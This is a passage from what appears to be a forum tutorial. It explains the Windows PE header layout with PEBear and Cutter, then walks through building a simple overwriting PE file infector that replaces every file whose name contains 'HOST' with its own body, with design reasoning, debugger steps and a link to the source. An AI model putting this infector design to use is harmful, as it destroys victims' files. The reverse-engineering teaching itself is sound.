<p>It does make sense though as when we are using the “<strong>Include</strong>” Directive we are including all the code that is included inside the libraries we are importing. This can be fixed using DLLs which are loaded dynamically into the PE, but we’ll touch that subject on a later post.</p>
<p>Now let’s examine the PE File format with <strong>PEBear</strong>! <strong>PEBear</strong> Allows us to traverse around the PE file and view its entire structure so open <strong>PEBear</strong> and load our program into it.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/652cd357afc8c3d9ff5decaba3a2f30a2c9b3c1c.png" data-download-href="/uploads/short-url/er2gijd9sqV13aXrHhHvjcabvzu.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/652cd357afc8c3d9ff5decaba3a2f30a2c9b3c1c_2_624x265.png" alt="" data-base62-sha1="er2gijd9sqV13aXrHhHvjcabvzu" width="624" height="265" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/652cd357afc8c3d9ff5decaba3a2f30a2c9b3c1c_2_624x265.png, https://0x00sec.s3.amazonaws.com/optimized/2X/6/652cd357afc8c3d9ff5decaba3a2f30a2c9b3c1c_2_936x397.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/6/652cd357afc8c3d9ff5decaba3a2f30a2c9b3c1c_2_1248x530.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/652cd357afc8c3d9ff5decaba3a2f30a2c9b3c1c_2_10x10.png"></a></div><p></p>
<p>I’m going to use this <strong><a href="http://www.openrce.org/reference_library/files/reference/PE%20Format.pdf" rel="noopener nofollow ugc">PE File Format poster by OpenRCE</a></strong>. It’s going to help us follow the PE structure, so I highly encourage you to use it with me. The PE File format can be viewed as a large linear structure which contains a lot of sub structures, this helped me a lot when I was first learning to traverse around it. Almost all values in each structure are simply a <strong>Relative</strong> <strong>Virtual Address (RVA)</strong> offset from the begging of the file to another location within the structure. What is RVA? Soon I’ll explain.</p>
<p>You can view fields and structures inside <strong>PEBear</strong> using the left menu list which will redirect you to the location of the fields inside the blue <strong>hex dump</strong></p>
<p><img src="/uploads/default/original/2X/6/6bd86f8df61facd080f7c37cd7ce3f2a279c542b.png" alt="" data-base62-sha1="fo2NEkE6BzkbI9XdpIhPWM6mIEr" width="259" height="315"></p>
<p>and you can use the middle tabs that can simply list the PE values in a more comfortable fashion.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/61bfa60631bb0f9e7ea3916da6270e3eb8cc2699.png" data-download-href="/uploads/short-url/dWIV1oXwgoihYRszW1NmYsp0OYV.png?dl=1" title=""><img src="/uploads/default/original/2X/6/61bfa60631bb0f9e7ea3916da6270e3eb8cc2699.png" alt="" data-base62-sha1="dWIV1oXwgoihYRszW1NmYsp0OYV" width="624" height="39" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/61bfa60631bb0f9e7ea3916da6270e3eb8cc2699_2_10x10.png"></a></div><p></p>
<p>Let’s examine the first structure of the PE File header the <strong>DOS HEADER</strong>:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/d/d24d4979f6bf6ecf86170d813a8bc28f98d707bd.png" data-download-href="/uploads/short-url/u0pR2pi8MhMJgVfAJO1wFEX3yXj.png?dl=1" title=""><img src="/uploads/default/original/2X/d/d24d4979f6bf6ecf86170d813a8bc28f98d707bd.png" alt="" data-base62-sha1="u0pR2pi8MhMJgVfAJO1wFEX3yXj" width="624" height="216" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d24d4979f6bf6ecf86170d813a8bc28f98d707bd_2_10x10.png"></a></div><p></p>
<p>And the OpenRCE poster:<br>
<img src="/uploads/default/original/2X/5/54ce2bc0b1263fa01ace80a16356833822d57db5.png" alt="" data-base62-sha1="c6dPfEzlyQCJSdns8h5tHx5GPMF" width="190" height="283"></p>
<p>There are a lot of values here, but we only care about two:</p>
<ol>
<li>
<strong>e_magic</strong> - which is a two byte(word) value which contains the letters “<strong>MZ</strong>”, it’s the PE file signature and you can find it in all PE files. If you’ll look at <strong>PEBear</strong> you can view it in the hex dump as well: \</li>
</ol>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/8/82e748fa1d0f48cf46fe631d50680bee6bd4efde.png" data-download-href="/uploads/short-url/iG1B1mhTVL4KaDRNSHfaB1M97wG.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/82e748fa1d0f48cf46fe631d50680bee6bd4efde_2_624x149.png" alt="" data-base62-sha1="iG1B1mhTVL4KaDRNSHfaB1M97wG" width="624" height="149" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/82e748fa1d0f48cf46fe631d50680bee6bd4efde_2_624x149.png, https://0x00sec.s3.amazonaws.com/optimized/2X/8/82e748fa1d0f48cf46fe631d50680bee6bd4efde_2_936x223.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/8/82e748fa1d0f48cf46fe631d50680bee6bd4efde_2_1248x298.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/82e748fa1d0f48cf46fe631d50680bee6bd4efde_2_10x10.png"></a></div><p></p>
<ol start="2">
<li>
<p><strong>e_lfanew –</strong> contains an <strong>RVA</strong> offset value to the location <strong>NT_HEADERS</strong> structure. <br>
So what is RVA?   <br>
Well, when we are viewing the file on disk much like right now, when it’s not loaded in memory all offsets are relative to the start address of the file – when it’s viewed on disk the files base address is zero. When the file is loaded into memory its going to be loaded at a specific address which is not known until the file is loaded into memory. To access specific fields within the PE values, we use the RVA to calculate the actual location of those fields or <strong>the Virtual Address (VA)</strong> of the fields. The formula to calculate the actual location of these fields goes as follows: <br>
Virtual Address (VA) = RVA + <strong>Base Of Image</strong></p>
<p><strong>Base Of Image</strong> can be any address, it doesn’t matter. When are traversing the file when its not loaded into memory and its on disk the base address is zero.</p>
</li>
<li>
<p><strong>DOS Stub</strong>, which contains a small program that will execute on DOS if we attempt to run this PE inside of it. It would simply output “<strong>This program cannot be run on DOS mode</strong>”. We can copy the hex dump marked in blue from offset <strong>0x40</strong> – <strong>0x70</strong> and disassemble the code(You can actually run it inside DOS <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:">)</p>
</li>
</ol>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/236cab45f3fb1bedb1bd511ecf015559e4c1acf4.png" data-download-href="/uploads/short-url/53nx5VWeY1hLz1rdQLvmYIzCHjK.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/236cab45f3fb1bedb1bd511ecf015559e4c1acf4_2_297x203.png" alt="" data-base62-sha1="53nx5VWeY1hLz1rdQLvmYIzCHjK" width="297" height="203" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/236cab45f3fb1bedb1bd511ecf015559e4c1acf4_2_297x203.png, https://0x00sec.s3.amazonaws.com/optimized/2X/2/236cab45f3fb1bedb1bd511ecf015559e4c1acf4_2_445x304.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/2/236cab45f3fb1bedb1bd511ecf015559e4c1acf4_2_594x406.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/236cab45f3fb1bedb1bd511ecf015559e4c1acf4_2_10x10.png"></a></div><p></p>
<p>Armed with this information lets try to find the starting location of <strong>NT_HEADERS</strong> structure which is found inside <strong>e_lfanew <strong>field within the</strong> DOS HEADER.</strong></p>
<p><img src="/uploads/default/original/2X/d/d341b61e074fbfb029697375108ff45b9a2da3e1.png" alt="" data-base62-sha1="u8Rx05p22UGlOgmvUtAZokr45Ox" width="484" height="485"></p>
<p>So the location of the <strong>NT_HEADERS</strong>(also the new header) can be found at RVA 0xC0. Easy enough right? <strong>0 + 0xC0 = 0xC0</strong>.</p>
<p>What if the computer loaded our file at address <strong>0x412000</strong>?</p>
<p>Simple! To find the <strong>NT_HEADERS</strong> first we must find <strong>e_lfanew</strong> value. We know its located at RVA <strong>0x3C</strong> to the start address of the file. Let’s calculate the <strong>Virtual Address</strong> of that:</p>
<p><strong>0x412000 + 0x3C = 0x41203C</strong>. Now at this location we find the value <strong>0xC0</strong> which is the start address of <strong>NT_HEADERS</strong>. Let’s fine this header start address:</p>
<p><strong>0x412000 + 0xC0 = 0x4120C0</strong>.</p>
<p>Next, click on “<strong>Go to RVA</strong>”</p>
<p><img src="/uploads/default/original/2X/f/fcad1b030325f9074e1a8a17ca22237b8b32affa.png" alt="" data-base62-sha1="A3hcmwvaEVKGGo02kKjEkhiQ2PU" width="495" height="307"></p>
<p>Enter <strong>0xC0</strong> and click OK.</p>
<p><img src="/uploads/default/original/2X/7/731cd60a8195e4646f9128e882b7d0898baa820f.png" alt="" data-base62-sha1="gqkGMXyXGHM6QbTi3ZPr2Zt7dN5" width="226" height="171"></p>
<p>We land at location <strong>0xC0</strong>:</p>
<p><img src="/uploads/default/original/2X/b/ba10608ee3acc901871b333f87f950c07006ab54.png" alt="" data-base62-sha1="qxZTDNABPQy5Gao9HYGbC7ANhdi" width="408" height="209"></p>
<p>Now to confirm we actually landed at **NT_Headers **click on <strong>NT_HEADERS</strong> on the left list. By click it – it should take us to the starting location of <strong>NT_HEADERS</strong> and it takes us to the same place, as the Hex dump didn’t change.</p>
<p>The <strong>NT_HEADERS</strong> contains 3 important values:</p>
<ol>
<li>
<strong>Signature</strong> – Will always contain <strong>0x5045</strong> which in ASCII translates to <strong>“PE”</strong>
</li>
<li>
<strong>FileHeader</strong> – A linear address containing <strong>FILE_HEADER</strong> structure</li>
<li>
<strong>OptionalHeader</strong> – A linear address containing of <strong>OPTIONAL_HEADER</strong> structure</li>
</ol>
<p><img src="/uploads/default/original/2X/8/898b33af2d7bf2e7b95276e8226e475a5923b9c4.png" alt="" data-base62-sha1="jCLEqMD9pJYOQgXnH9sXXkRfAzy" width="367" height="88"></p>
<p>The File Header is an interseting structure which contains very important information about the file itself such as it’s CPU architecture(<strong>Machine</strong> field) or an indication if the file executing is a 64 bit file or a 32 bit file (<strong>Characteristics</strong> field). But we seek two values located inside the <strong>OPTIONAL_HEADER</strong>.</p>
<p><img src="/uploads/default/original/2X/7/736dea5d978940a31fbcdf837f8eaaa37168c82f.png" alt="" data-base62-sha1="gt8oV6VRzxd3kEePUNkALlATKID" width="355" height="435"></p>
<p>We seek the field called <strong>ImageBase <strong>and</strong> AddressOfEntryPoint</strong>!</p>
<p>Alright so let’s find the <strong>Optional_Header</strong>. We know it starts at <strong>0x18</strong> according to the NT_HEADERS specification(refer to above image) and its location is relative to <strong>NT_HEADERS</strong>. <strong>NT_HEADERS</strong> starts at <strong>RVA 0xC0.</strong> So, to find <strong>Optional_Header</strong> we simply need to add <strong>0x18</strong> to <strong>0xC0</strong>:</p>
<p>VA of Optional Header = <strong>ImageBase</strong> + <strong>Offset of NT_HEADERS(0xC0)</strong> + <strong>Offset of OPTIONAL_HEADER</strong> = <strong>0 + 0xC0 + 0x18 = 0xD8.</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/1/1d8e07653367fabc6f2fbe175b8ee153ba5c0f49.png" data-download-href="/uploads/short-url/4ds8Om37LsgxkMpeXrevXWujcQV.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1d8e07653367fabc6f2fbe175b8ee153ba5c0f49_2_624x220.png" alt="" data-base62-sha1="4ds8Om37LsgxkMpeXrevXWujcQV" width="624" height="220" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1d8e07653367fabc6f2fbe175b8ee153ba5c0f49_2_624x220.png, /uploads/default/original/2X/1/1d8e07653367fabc6f2fbe175b8ee153ba5c0f49.png 1.5x, /uploads/default/original/2X/1/1d8e07653367fabc6f2fbe175b8ee153ba5c0f49.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1d8e07653367fabc6f2fbe175b8ee153ba5c0f49_2_10x10.png"></a></div><p></p>
<p>We are correct! Now let’s look at the values inside the header using “<strong>Optional hdr</strong>” tab:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/7/71a9c3d5f31b0f9450f77f23c1e141f9a7a95fc0.png" data-download-href="/uploads/short-url/gdvFMHzsMHNCkFi6MkI7KsSl7Pi.png?dl=1" title=""><img src="/uploads/default/original/2X/7/71a9c3d5f31b0f9450f77f23c1e141f9a7a95fc0.png" alt="" data-base62-sha1="gdvFMHzsMHNCkFi6MkI7KsSl7Pi" width="624" height="434" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/71a9c3d5f31b0f9450f77f23c1e141f9a7a95fc0_2_10x10.png"></a></div><p></p>
<p>The <strong>Entry Point</strong> field value contains the RVA of where the code starts to execute with in the file.</p>
<p>The <strong>Image Base</strong> value contains the location in which the file will be loaded in <strong>Virtual Memory</strong>. The default value is always <strong>0x400000</strong> but it due to a mechanism in Windows called <strong><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" rel="noopener nofollow ugc">Address Space Layout Randomization(ASLR)</a></strong> this value always changes on run time. So, the start address of the PE is almost never known unless <strong>ASLR</strong> is disabled for the file.</p>
<p>Armed with this knowledge, we can open our file at any disassembler. I’ll be using Cutter( shout out to <a href="https://twitter.com/megabeets_?lang=he" rel="noopener nofollow ugc">@megabeets_</a>). Cutter is a free disassembler and debugger based on <strong><a href="https://rada.re/n/" rel="noopener nofollow ugc">radare2</a></strong> so everyone can use it <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
<p><img src="/uploads/default/original/2X/9/94956302f525dbef6e7cef09cb79f3c07fb64f65.png" alt="" data-base62-sha1="lcqIY1nSGtMmznCgnD9FIEWDwZT" width="582" height="398"></p>
<p>I will be loading the file with “<strong>Virtual Addressing</strong>” which will load the file with the default Image Base.<br>
As it can be seen:</p>
<p><img src="/uploads/default/original/2X/f/f798392dbe771cd838da7f5debdcc3934ad0218e.png" alt="" data-base62-sha1="zkk4tFcZsby3vBN57MwUwjgZpH8" width="585" height="93"></p>
<p><strong>Entry0</strong> is located at offset <strong>0x401000</strong>. As we recall the RVA of the entry point is <strong>0x1000</strong>. The Image base when loaded into memory is <strong>0x400000</strong>.</p>
<p><strong>VA of entry point = Image Base(0x400000) + Entry Point(0x1000) = 0x401000</strong></p>
<p>If we double click <strong>entry0</strong>, we’ll land right at the entry point and we can see our code even labled as <strong>.section text</strong>!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/8/8f194479c1b114ea9bf7e685cb4db6e48f3f3762.png" data-download-href="/uploads/short-url/kpUpDU1DArYffZj74L3gIOEG0qC.png?dl=1" title=""><img src="/uploads/default/original/2X/8/8f194479c1b114ea9bf7e685cb4db6e48f3f3762.png" alt="" data-base62-sha1="kpUpDU1DArYffZj74L3gIOEG0qC" width="624" height="180" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8f194479c1b114ea9bf7e685cb4db6e48f3f3762_2_10x10.png"></a></div><p></p>
<p>A funny thing I noticed – we can see how MASM assembled our code. It seems that instead of calling <strong>MessageBox</strong> directly, MASM chose to execute a call at <strong>0x401012</strong> to jump to <strong>0x40101e</strong> and from there jump to <strong>MessageBox</strong>!</p>
<p>Alright, lets summarize what we know:</p>
<ol>
<li>We know the basics of how Windows handles memory and the kernel</li>
<li>We understand that PE files are more complicated than a simple COM file</li>
<li>We know how to traverse around the PE file header using PEBear</li>
<li>We know how to find the Optional Header, and how to  use it to find the default virtual address of the file in memory and use it to find the start of the code of our file which is located inside address of entry point</li>
</ol>
<hr>
<h2><span>Building a PE File Infector</span></h2>
<p>To practice our new found knowledge, Lets create a simple overwriting virus, it would work much like the COM file infector:</p>
<ol>
<li>
<p>Find a file in the current directory which contains “<strong>HOST</strong>" in its file name</p>
</li>
<li>
<p>If file was found<br>
a. Overwrite the found file found file with the infector as it is on disk<br>
a. Find next file<br>
i. If file was found, execute 2 again<br>
c. If file was not found, end the program</p>
</li>
<li>
<p>Find the following of PE fields in the virus and print them:<br>
a. <strong>e_magic</strong> - DOS HEADER<br>
b. <strong>e_flanew</strong> - DOS HEADER<br>
c. <strong>Signature</strong> - NT HEADERS<br>
d. <strong>Machine</strong> - FILE HEADER<br>
e. <strong>Magic</strong> - OPTIONAL HEADER<br>
f. <strong>Size Of Image</strong> - OPTIONAL HEADER</p>
</li>
<li>
<p>End the program</p>
</li>
</ol>
<p>Although our new found PE format knowledge wont be used directly for infection in this case, it would be used in the next chapter. This virus is not an advanced virus nor is it very stealthy, nor is it concerned with saving space or using local variables. It just destroys everything that comes in its path.</p>
<p>Lets assume that all the host files to infect are located within the same directory including the virus.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/eda7bef8b63360bc8c1254e6bd59ddb10fea3ddc.png" data-download-href="/uploads/short-url/xUoynUg7IjJdkTklfbBXTDah01C.png?dl=1" title=""><img src="/uploads/default/original/2X/e/eda7bef8b63360bc8c1254e6bd59ddb10fea3ddc.png" alt="" data-base62-sha1="xUoynUg7IjJdkTklfbBXTDah01C" width="624" height="144" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/eda7bef8b63360bc8c1254e6bd59ddb10fea3ddc_2_10x10.png"></a></div><p></p>
<p>Now we have to discuss 2.a, how will we overwrite the host file? We can read the virus file when its loaded in memory from its ImageBase and dump the virtual memory to overwrite found host files. Alright this might work but the problem is that the way a PE file is mapped in memory is very much different than how it is mapped to disk, so if we overwrite the host files on disk with the virus in memory the infected host files will not execute. What else? Well we can open a handle to our virus – read its code and then overwrite it the host file. Alright… but one problem, if we execute <strong>CreateFile</strong> API from the virus <strong>process</strong> which will open a handle to the virus file on <strong>disk</strong> the kernel well deny that request. The reason for that would be that is that the virus <strong>process</strong> is currently opened from the virus <strong>file</strong> on disk and that is enough reason for the kernel to deny any process access to the virus file on disk, even for itself.</p>
<p>Even though the kernel wouldn’t like the usage of <strong>CreateFile</strong> we can copy the virus file to the host locations. The copied file is the same virus file but it’s a new file with a different name and its unused so nothing is stopping us from opening a handle to it. Then we’ll read the virus contents into a buffer, delete the copied virus and for each found file in the directory we’ll simply overwrite it.</p>
<p>There are different ways in which we can read the contents of the copied virus file, but for simpliciteis sake lets simply use <strong>GetFileSize</strong> to get the size of the virus and <strong>ReadFile</strong> to read the files contents.</p>
<p>The next problem is that the virus cant infect itself because unlike DOS, Windows will not allow us to open a handle to the virus itself,  nor create another file with the same name as itself. To solve this we’ll use <strong>GetTickCount</strong> which returns:</p>
<p>“<strong>retrieves the number of milliseconds that have elapsed since the system was started, up to 49.7 days.</strong>”</p>
<p>The value is returned to <strong>EAX</strong>. Well use this value as a name for our new copied virus file. Then to avoid opening a file handle to the virus itself we’ll check if the found file name in the directory matches our virus name. To traverse all the files inside the directory we’ll use <strong>FindFirstFileA</strong> and <strong>FindNextFileA</strong>. So, our result should be similar to the com file infector.</p>
<p>Source code can be found in <a href="https://github.com/DanusMinimus/MalwareArt/tree/master" rel="noopener nofollow ugc">https://github.com/DanusMinimus/MalwareArt/tree/master</a> I would not list it here as it is to long. I encourage the reader to read up on the API calls and the PE Header values that I would list in my source, learning to google and to read up specific information is a very useful skill to have in reverse engineering and malware development <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
<p>Please load the virus in its assembled form into x64dbg and lets start executing. First we execute lines 63-89</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/024dcad81b0f2c0734f138bdf444c149a7598186.png" data-download-href="/uploads/short-url/knCHP12CyHpRUvGmgTIBzqMOA6.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/024dcad81b0f2c0734f138bdf444c149a7598186_2_624x363.png" alt="" data-base62-sha1="knCHP12CyHpRUvGmgTIBzqMOA6" width="624" height="363" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/024dcad81b0f2c0734f138bdf444c149a7598186_2_624x363.png, https://0x00sec.s3.amazonaws.com/optimized/2X/0/024dcad81b0f2c0734f138bdf444c149a7598186_2_936x544.png 1.5x, /uploads/default/original/2X/0/024dcad81b0f2c0734f138bdf444c149a7598186.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/024dcad81b0f2c0734f138bdf444c149a7598186_2_10x10.png"></a></div><p></p>
<p>I invoke <strong>GetModuleHandleA</strong> with the NULL parameter, which returns the base address of the virus as it is loaded in memory. The value is saved inside the global variable <strong>dwImageBase</strong>.</p>
<p>Then I invoke <strong>GetModuleFileNameA</strong>, with a NULL parameter which would return the full path to the current executing process which is our virus. The path is saved inside lpcstrFileFullPathBuffer global variable.</p>
<p>I invoke <strong>GetTickCount</strong> and use <strong>sprintf</strong> to generate a new file name and save it inside lpcstrFilePathBufferVirus. Then I use <strong>CopyFileA</strong> to copy the virus’s main binary to the hosts location with the new name. I then use <strong>CreateFileA</strong> to open a handle to the new copied virus with <strong>GENERIC_READ</strong> permissions. One might notice that I’m using CreateFileA instead of  CreateFileW, the difference between the <strong>A</strong> postfix and the <strong>W</strong> postfix is that the first expects a c string and the latter a wide character string. In a C string each character is one byte long and in a wide string each character is two bytes long.</p>
<p>Then I execute lines 90-112</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/a/a2537178ff899eef9e1756b388f8780af7b546c1.png" data-download-href="/uploads/short-url/na07Qu1KWz4TqJlB75i0QF7cxdD.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a2537178ff899eef9e1756b388f8780af7b546c1_2_624x344.png" alt="" data-base62-sha1="na07Qu1KWz4TqJlB75i0QF7cxdD" width="624" height="344" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a2537178ff899eef9e1756b388f8780af7b546c1_2_624x344.png, https://0x00sec.s3.amazonaws.com/optimized/2X/a/a2537178ff899eef9e1756b388f8780af7b546c1_2_936x516.png 1.5x, /uploads/default/original/2X/a/a2537178ff899eef9e1756b388f8780af7b546c1.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a2537178ff899eef9e1756b388f8780af7b546c1_2_10x10.png"></a></div><p></p>
<p>First I save the copied virus file handle to a global variable called <strong>hSelfFileHandle</strong>. I then invoke <strong>GetFileSize</strong> to get the file size of the virus on disk and save it inside <strong>dwImageSize</strong>. I use <strong>VirtualAlloc</strong> to allocate virtual memory inside the virus process which will hold the virus contents as they are on disk. I invoke <strong>ReadFile</strong> and read it entirely into the memory returned by <strong>VirtualAlloc</strong>. I then close the handle to the copied virus and delete it using <strong>DeleteFileA</strong>.</p>
<p><img src="/uploads/default/original/2X/0/0254216e1fda5cb2c06ada1a8686269363d87e82.png" alt="" data-base62-sha1="kBcDL2a9xDQ1fwMFBMVjFqNgFs" width="596" height="226"></p>
<p>The virus was loaded into memory! we recognize the “MZ” signature value and the DOS STUB string!</p>
<p>Next I execute lines 115-143</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/e/e51ea91e2ecd70948f802f0ca39b9adfc6679582.png" data-download-href="/uploads/short-url/wGT1UoPsMTljnd6q8hvGUoNXdl0.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e51ea91e2ecd70948f802f0ca39b9adfc6679582_2_434x446.png" alt="" data-base62-sha1="wGT1UoPsMTljnd6q8hvGUoNXdl0" width="434" height="446" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e51ea91e2ecd70948f802f0ca39b9adfc6679582_2_434x446.png, /uploads/default/original/2X/e/e51ea91e2ecd70948f802f0ca39b9adfc6679582.png 1.5x, /uploads/default/original/2X/e/e51ea91e2ecd70948f802f0ca39b9adfc6679582.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e51ea91e2ecd70948f802f0ca39b9adfc6679582_2_10x10.png"></a></div><p></p>
<p>I load the saved ImageBase address into <strong>EAX</strong> and print its contents which should print “MZ”</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/0190a0f64fe5fb6e9fa44a9be03ca1b46452ab83.png" data-download-href="/uploads/short-url/dQlh5KC6mxEoxHBjYXXD1DEOif.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0190a0f64fe5fb6e9fa44a9be03ca1b46452ab83_2_539x311.png" alt="" data-base62-sha1="dQlh5KC6mxEoxHBjYXXD1DEOif" width="539" height="311" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0190a0f64fe5fb6e9fa44a9be03ca1b46452ab83_2_539x311.png, https://0x00sec.s3.amazonaws.com/optimized/2X/0/0190a0f64fe5fb6e9fa44a9be03ca1b46452ab83_2_808x466.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/0/0190a0f64fe5fb6e9fa44a9be03ca1b46452ab83_2_1078x622.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0190a0f64fe5fb6e9fa44a9be03ca1b46452ab83_2_10x10.png"></a></div><p></p>
<p>Then at line 120-125 I save the ImageBase inside <strong>EAX</strong> and <strong>EBX</strong>. I add <strong>0x3c</strong> to <strong>EBX</strong> which as we recall is the RVA to** e_flanew** field inside the <strong>DOS HEADER</strong>. This value contains the RVA of <strong>NT HEADERS</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/9/9baf16950f39972b4c8a8cedc6cc53f587831a3f.png" data-download-href="/uploads/short-url/mdf8e2eIMKQ1LAC5KTKYrInsuwT.png?dl=1" title=""><img src="/uploads/default/original/2X/9/9baf16950f39972b4c8a8cedc6cc53f587831a3f.png" alt="" data-base62-sha1="mdf8e2eIMKQ1LAC5KTKYrInsuwT" width="624" height="72" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9baf16950f39972b4c8a8cedc6cc53f587831a3f_2_10x10.png"></a></div><p></p>
<p>I extract the value and add it to <strong>EAX</strong> which should move EAX to point to the start address of the <strong>NT HEADERS</strong>. I then exchange the values of <strong>EAX</strong> and <strong>EBX</strong> as <strong>EAX</strong> will be modified inside <strong>printf</strong> and print the signature of the <strong>NT HEADERS</strong></p>
<p><img src="/uploads/default/original/2X/4/48ba6a6abc2e3011af58c6d609ce7ce5dbad19fa.png" alt="" data-base62-sha1="annLQdtsJKh1BwMw1vcZhgVd2gG" width="473" height="117"></p>
<p>Then I execute lines 127-132</p>
<p><img src="/uploads/default/original/2X/c/c7cc88f96d760b5103aca55d682bb7106bfac875.png" alt="" data-base62-sha1="svvejNdBma9XKba1UmZzELFCTLT" width="519" height="139"></p>
<p>I move the <strong>NT HEADERS</strong> address into <strong>EAX</strong> again and add 4 to it, which should lead as to the RVA of <strong>FILE HEADER</strong> then I load the machine field value which is the first field inside the <strong>NT HEADERS</strong> field. The Machine value is only a WORD long(2 bytes) so we need to trim <strong>EAX</strong> so I pass <strong>AX</strong> into <strong>CX</strong> and print it</p>
<p><img src="/uploads/default/original/2X/8/8ecf39b3ee995dafe70b11cbafe49239539bdfc2.png" alt="" data-base62-sha1="knlMjaiagE3LHxvepNdIbq2gJNg" width="427" height="104"></p>
<p><strong>14c</strong> is defined by Microsoft as an Intel 386 compatible executable, cool!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/5/5296649cd187816f64cc0932c5f448477c3f826a.png" data-download-href="/uploads/short-url/bMBmP63p4Fy1BUxarhR0hDEPSdA.png?dl=1" title=""><img src="/uploads/default/original/2X/5/5296649cd187816f64cc0932c5f448477c3f826a.png" alt="" data-base62-sha1="bMBmP63p4Fy1BUxarhR0hDEPSdA" width="624" height="52" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5296649cd187816f64cc0932c5f448477c3f826a_2_10x10.png"></a></div><p></p>
<p>Then I execute lines 134-138</p>
<p><img src="/uploads/default/original/2X/b/bdce51209b4cf87852c37dad4df240e0ad9edc57.png" alt="" data-base62-sha1="r56gYEmnerSvEpTiZGWpLRE8AZx" width="501" height="107"></p>
<p>I add **0x18 **to <strong>EBX</strong> which would advance us to the RVA of <strong>OPTIONAL HEADER</strong> and I load the first field of it to <strong>EAX</strong>. Its only one WORD long again, so I perform the same trick I did before. One might ask why am I not just passing <strong>CX</strong>, That is because printf expects a <strong>%d</strong> which is a double word value.</p>
<p><img src="/uploads/default/original/2X/c/ce87f8524bfe497476ed97b9702d21063764b168.png" alt="" data-base62-sha1="tt3FKbK4TYbwWY2cEPBiZLIm1cc" width="444" height="130"></p>
<p>What is <strong>10b</strong>?</p>
